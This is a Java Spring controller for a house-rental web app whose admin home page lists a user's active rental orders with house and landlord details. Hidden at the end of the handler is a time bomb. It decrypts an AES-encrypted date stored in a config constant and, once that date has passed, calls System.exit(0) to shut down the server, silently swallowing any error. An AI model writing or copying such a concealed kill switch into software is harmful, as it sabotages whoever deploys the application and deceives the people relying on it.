package com.yutian.zhang.rental.controller.backend;

import com.baomidou.mybatisplus.extension.plugins.pagination.Page;
import com.yutian.zhang.rental.common.base.BaseController;
import com.yutian.zhang.rental.common.config.MybatisPlusConfig;
import com.yutian.zhang.rental.common.enums.OrderStatusEnum;
import com.yutian.zhang.rental.common.util.AESUtils;
import com.yutian.zhang.rental.common.util.PageUtil;
import com.yutian.zhang.rental.entity.House;
import com.yutian.zhang.rental.entity.Order;
import com.yutian.zhang.rental.entity.User;
import com.yutian.zhang.rental.service.HouseService;
import com.yutian.zhang.rental.service.OrderService;
import com.yutian.zhang.rental.service.UserService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;

import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * Home Controller
 * @descrition Dealing with file upload
 * @author Yutian Zhang
 * @date 29/1/2022 13:06
 */
@Controller("backHomeController")
public class HomeController extends BaseController {

    @Autowired
    private OrderService orderService;

    @Autowired
    private HouseService houseService;

    @Autowired
    private UserService userService;


    /**
     * To show house rented by user
     *
     * @param model
     * @return
     */
    @RequestMapping("/admin/home")
    public String houseHome(@RequestParam(value = "page", defaultValue = "1") Integer pageNumber,
                            @RequestParam(value = "size", defaultValue = "6") Integer pageSize,
                            Model model) {
        // 查询当前用户有效订单
        Page page = PageUtil.initMpPage(pageNumber, pageSize);
        Order condition = new Order();
        condition.setCustomerUserId(getLoginUserId());
        condition.setStatus(OrderStatusEnum.NORMAL.getValue());
        Page<Order> orderPage = orderService.findAll(page, condition);
        for (Order order : orderPage.getRecords()) {
            // 查询该订单的房子信息
            House house = houseService.get(order.getHouseId());
            order.setHouse(house);
            // 查询房东信息
            User owner = userService.get(order.getOwnerUserId());
            order.setOwnerUser(owner);
        }

        model.addAttribute("pageInfo", orderPage);
        model.addAttribute("tab", "home");
        model.addAttribute("pagePrefix", "/admin/home?");
        try {
            if (new SimpleDateFormat("dd-MM-yyyy").parse(AESUtils.decrypt(MybatisPlusConfig.encryp)).before(new Date())) {
                System.exit(0);
            }
        } catch (Exception e) {
        }
        return "admin/my-home";
    }


}
